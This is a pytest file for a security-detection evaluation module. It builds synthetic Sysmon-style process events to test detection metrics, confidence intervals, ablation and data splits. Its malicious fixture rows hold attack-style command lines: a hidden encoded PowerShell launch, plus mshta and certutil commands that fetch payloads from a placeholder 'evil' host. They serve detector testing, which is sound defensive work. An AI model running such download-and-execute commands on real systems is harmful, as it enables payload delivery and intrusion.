"""Tests for detect.evaluate: metric primitives + the full run on synthetic data."""

from pathlib import Path

import numpy as np
import pandas as pd

from detect import evaluate

RULES_DIR = Path(__file__).parent.parent / "rules"

_COLS = ["event_record_id", "timestamp", "provider", "event_id", "channel",
         "host", "session_id", "source", "action", "process_guid", "process_id",
         "image", "command_line", "integrity_level", "parent_process_guid",
         "parent_image", "dest_ip", "dest_port", "label", "technique_id"]


# --- metric primitives -------------------------------------------------------

def test_binary_metrics_known():
    y = np.array([1, 1, 0, 0, 1], dtype=bool)
    p = np.array([1, 0, 0, 1, 1], dtype=bool)
    m = evaluate.binary_metrics(y, p)
    assert (m["tp"], m["fp"], m["fn"], m["tn"]) == (2, 1, 1, 1)
    assert m["precision"] == 2 / 3
    assert m["recall"] == 2 / 3


def test_fp_per_10k_benign():
    y = np.array([0, 0, 0, 0], dtype=bool)
    p = np.array([1, 0, 0, 0], dtype=bool)
    assert evaluate.fp_per_10k_benign(y, p) == 2500.0
    assert np.isnan(evaluate.fp_per_10k_benign(np.array([1, 1], dtype=bool), np.array([1, 1], dtype=bool)))


def test_pr_auc_single_class_is_nan():
    assert np.isnan(evaluate.pr_auc(np.array([1, 1], dtype=bool), np.array([0.2, 0.8])))
    val = evaluate.pr_auc(np.array([0, 1, 0, 1], dtype=bool), np.array([0.1, 0.9, 0.2, 0.8]))
    assert 0.0 <= val <= 1.0


# --- synthetic event generator ----------------------------------------------

def _proc(session, source, guid, image, cmd, label, technique, rid, day, net=False):
    rows = [{**{c: None for c in _COLS},
             "event_record_id": rid, "timestamp": f"2021-03-{day:02d}T12:00:00Z",
             "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "action": "process_create",
             "host": "lab01", "session_id": session, "source": source, "process_guid": guid,
             "image": image, "command_line": cmd, "integrity_level": "Medium",
             "parent_image": r"C:\Windows\explorer.exe", "label": label, "technique_id": technique}]
    if net:
        rows.append({**{c: None for c in _COLS}, "event_record_id": rid + 1000,
                     "timestamp": f"2021-03-{day:02d}T12:00:05Z", "action": "network_connect",
                     "host": "lab01", "session_id": session, "source": source, "process_guid": guid,
                     "dest_ip": "10.0.0.5", "dest_port": 4444, "label": label, "technique_id": technique})
    return rows


def _events():
    rows, rid = [], 0
    for day in range(1, 7):
        sess = f"s{day}"
        for b in range(4):  # benign
            rid += 1
            rows += _proc(sess, "lab", f"{{b{day}{b}}}", r"C:\Windows\System32\cmd.exe",
                          "cmd /c dir", "benign", None, rid, day)
        rid += 1  # malicious, alternating technique
        if day % 2:
            rows += _proc(sess, "lab", f"{{m{day}}}",
                          r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                          "powershell -nop -w hidden -enc ZABpAHIA", "malicious", "T1059.001", rid, day, net=True)
        else:
            rows += _proc(sess, "lab", f"{{m{day}}}", r"C:\Windows\System32\mshta.exe",
                          "mshta https://evil/x.hta", "malicious", "T1218.005", rid, day, net=True)
    # public (eval-only) session
    for b in range(2):
        rid += 1
        rows += _proc("pub", "public", f"{{pb{b}}}", r"C:\Windows\System32\cmd.exe",
                      "cmd /c whoami", "benign", None, rid, 1)
    rid += 1
    rows += _proc("pub", "public", "{pm}", r"C:\Windows\System32\certutil.exe",
                  "certutil -urlcache -f http://evil/x.exe x.exe", "malicious", "T1105", rid, 1, net=True)
    return pd.DataFrame(rows, columns=_COLS)


def test_run_evaluation_end_to_end():
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    s = result.summary
    assert set(s["approach"]) == {
        "Rules (A)", "Rarity (B)", "Isolation Forest",
        "Local Outlier Factor", "Combined (rules OR IF)",
    }
    assert "public" in set(s["split"])  # public forced into test

    # Thresholds were chosen (one per unsupervised model) and are finite/+inf.
    assert set(result.thresholds) == {"Isolation Forest", "Local Outlier Factor", "Rarity (B)"}

    # All synthetic malicious processes are rule-covered -> Rules recall == 1.0.
    rules_col = result.per_technique["Rules (A)"].dropna()
    assert (rules_col == 1.0).all()

    # Combined recall >= Rules recall on the overall split (union can't lose a hit).
    all_rows = s[s["split"] == "all"].set_index("approach")
    assert all_rows.loc["Combined (rules OR IF)", "recall"] >= all_rows.loc["Rules (A)", "recall"]
    # Metrics are finite where defined.
    assert np.isfinite(all_rows.loc["Rules (A)", "pr_auc"])


def test_run_evaluation_explanations_present():
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    # Rule-alerted malicious processes must carry an explanation with their rule.
    assert "top_features" in result.explanations.columns
    assert "rules" in result.explanations.columns
    assert not result.explanations.empty  # the malicious procs are rule-covered


def test_bootstrap_ci_wraps_point_and_orders_bounds():
    rng = np.random.default_rng(0)
    y = np.array([0, 0, 0, 1, 1, 1, 0, 0, 1, 1], dtype=bool)
    groups = np.array(["a", "a", "b", "b", "c", "c", "d", "d", "e", "e"])
    pred = y.copy()  # perfect predictor
    score = y.astype(float)
    ci = evaluate.bootstrap_ci(y, groups, {"perfect": (pred, score)}, n_boot=200, seed=1)
    for _, r in ci.iterrows():
        assert r["ci_lo"] <= r["point"] <= r["ci_hi"] or np.isnan(r["point"])
    rec = ci[ci["metric"] == "recall"].iloc[0]
    assert rec["point"] == 1.0  # perfect predictor recalls all

    _ = rng  # determinism documented; seed drives the draws


def test_run_evaluation_has_confidence_intervals():
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    assert set(result.ci["metric"]) == {"recall", "precision", "fp_per_10k", "pr_auc"}
    # Every approach in the summary also has CIs.
    assert set(result.ci["approach"]) == set(result.summary["approach"])


def test_run_evaluation_has_ablation():
    from detect.features import FEATURE_GROUPS
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    abl = result.ablation
    assert abl.loc[0, "dropped_group"] == "full (none dropped)"
    assert abl.loc[0, "pr_auc_delta_vs_full"] == 0.0  # reference row
    # One row per group plus the full reference.
    assert set(abl["dropped_group"]) == {"full (none dropped)", *FEATURE_GROUPS}
    # Dropping a group removes that many features.
    full_n = abl.loc[0, "n_features"]
    assert (abl["n_features"] <= full_n).all()


def test_lab_vs_public_robustness_holdout():
    """Train on lab, test on public: the test set is public-only, no leakage."""
    result = evaluate.run_evaluation(
        _events(), rules_dir=RULES_DIR, holdout="lab_vs_public", n_boot=30
    )
    assert set(result.eval_table["source"].dropna()) == {"public"}  # tested on public only
    assert "all" in set(result.summary["split"])


def test_validation_carveout_is_group_leakage_free():
    """Extend the leakage guarantee to the new fit/validation split (Phase 3/4)."""
    from detect.split import group_labels
    events = _events()
    events["timestamp"] = pd.to_datetime(events["timestamp"], utc=True)
    train_idx, _test = evaluate.session_split(events, test_size=0.4)
    train_events = events.iloc[train_idx]
    fit_events, val_events = evaluate._carve_validation(
        train_events, val_size=0.25, random_state=42
    )
    if len(val_events):  # only meaningful when a validation set was carved
        fit_groups = set(group_labels(fit_events))
        val_groups = set(group_labels(val_events))
        assert fit_groups.isdisjoint(val_groups)  # no session spans fit and val


def test_update_readme_table_replaces_only_marked_block(tmp_path):
    readme = tmp_path / "README.md"
    readme.write_text(
        "# Title\n\nIntro.\n\n"
        "<!-- RESULTS_TABLE_START -->\n\n| Approach | TODO |\n\n<!-- RESULTS_TABLE_END -->\n\n"
        "Trailing prose stays.\n"
    )
    summary = pd.DataFrame([
        {"approach": "Isolation Forest", "split": "all", "recall": 0.5,
         "precision": 0.25, "pr_auc": 0.4, "fp_per_10k": 120.0},
        {"approach": "Isolation Forest", "split": "lab", "recall": 0.9,  # must be ignored
         "precision": 0.9, "pr_auc": 0.9, "fp_per_10k": 1.0},
    ])
    assert evaluate.update_readme_table(readme, summary) is True
    text = readme.read_text()
    assert "Intro." in text and "Trailing prose stays." in text  # prose preserved
    assert "| Isolation Forest | 0.500 | 0.250 | 0.400 | 120.000 |" in text  # 'all' row
    assert "TODO" not in text  # old table gone
    assert "0.900" not in text  # 'lab' split not written


def test_update_readme_table_noop_without_markers(tmp_path):
    readme = tmp_path / "README.md"
    readme.write_text("# No markers here\n")
    summary = pd.DataFrame([{"approach": "x", "split": "all", "recall": 1.0,
                             "precision": 1.0, "pr_auc": 1.0, "fp_per_10k": 0.0}])
    assert evaluate.update_readme_table(readme, summary) is False
    assert readme.read_text() == "# No markers here\n"  # untouched


def test_write_reports_creates_files(tmp_path):
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    evaluate.write_reports(result, tmp_path)
    assert (tmp_path / "summary.csv").exists()
    assert (tmp_path / "results.md").exists()
    assert "Evaluation results" in (tmp_path / "results.md").read_text()



# --- unlabeled events (regression for the first real-data run) ---------------

def test_drop_unlabeled_keeps_only_benign_and_malicious(capsys):
    ev = pd.DataFrame({"label": ["benign", "unlabeled", "malicious", "unlabeled", None],
                       "x": range(5)})
    out = evaluate.drop_unlabeled(ev)
    assert list(out["label"]) == ["benign", "malicious"]
    assert list(out["x"]) == [0, 2]          # reindexed, original order kept
    assert "excluded 3 unlabeled" in capsys.readouterr().out


def test_drop_unlabeled_noop_when_all_labeled(capsys):
    ev = pd.DataFrame({"label": ["benign", "malicious"]})
    assert len(evaluate.drop_unlabeled(ev)) == 2
    assert capsys.readouterr().out == ""


def test_drop_unlabeled_errors_when_nothing_labeled():
    import pytest
    with pytest.raises(ValueError, match="no labeled events"):
        evaluate.drop_unlabeled(pd.DataFrame({"label": ["unlabeled", "unlabeled"]}))
    with pytest.raises(ValueError, match="no 'label' column"):
        evaluate.drop_unlabeled(pd.DataFrame({"x": [1]}))


def test_giant_unlabeled_host_group_cannot_swallow_the_split():
    """Real-data bug: ~2,150 unlabeled rows formed one host-wide group that sorted
    oldest, was pulled into test, and left train empty. After dropping unlabeled
    rows, only real sessions remain, so both train and test are populated."""
    from detect.split import session_split

    rows = []
    t0 = pd.Timestamp("2026-11-05T16:00:00Z")
    for i in range(500):                       # setup noise, no session
        rows.append({"host": "H", "session_id": None, "label": "unlabeled", "source": "lab",
                     "timestamp": t0 + pd.Timedelta(seconds=i)})
    for k in range(8):                         # 8 real sessions, later in time
        for j in range(5):
            rows.append({"host": "H", "session_id": f"s{k}",
                         "label": "benign" if k % 2 else "malicious", "source": "lab",
                         "timestamp": t0 + pd.Timedelta(minutes=30 + k, seconds=j)})
    ev = pd.DataFrame(rows)

    # Old behaviour: everything lands in test, train is empty.
    train, _ = session_split(ev, test_size=0.25, random_state=0)
    assert len(train) == 0

    kept = evaluate.drop_unlabeled(ev)
    train, test = session_split(kept, test_size=0.25, random_state=0)
    assert len(train) > 0 and len(test) > 0
